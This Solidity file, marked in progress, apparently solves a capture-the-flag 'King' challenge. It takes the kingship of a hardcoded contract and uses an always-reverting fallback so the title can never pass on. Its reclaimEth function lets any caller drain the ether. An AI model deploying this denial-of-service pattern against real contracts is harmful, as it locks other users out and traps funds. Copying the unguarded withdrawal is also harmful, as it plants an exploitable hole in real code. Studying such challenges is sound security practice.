// SPDX-License-Identifier: MIT
// IN PROGRESS

pragma solidity >= 0.8;

// Contract should contain a transfer function of at least 0.001 eth (current prize of King contract)
// This will trigger the transfer for this contract to become king
contract AttackKing {
    address kingContractAddress = 0x36d467FBe1dd1035B9369ff1A54E83106163b906;
    uint public amount = 2000000000000000 wei; //0.002 eth

    // Payable because we need to seed the contract with at least 0.001 eth so that we can send it to the King instance
    constructor() payable {}

    // Transfer whatever eth is in this contract to the king contract
    function attackKingFunction() public {
        // 3 most used ways of transferring eth are .send(), .transfer() & .call()
        // .call() is preferred as it's possible to specify the value and the gas
        // Although it's bad practice generally to specific hard limits for gas as these can vary in the future
        kingContractAddress.call{ value: amount, gas: 100000 }("");
    }

    // Reclaim Eth
    function reclaimEth() public {
        msg.sender.call{value: amount, gas: 100000}("");
    }

    // Fallback doesn't contain receive function which is needed to transfer kingship
    fallback() external payable {
        revert("KO");
    }
}
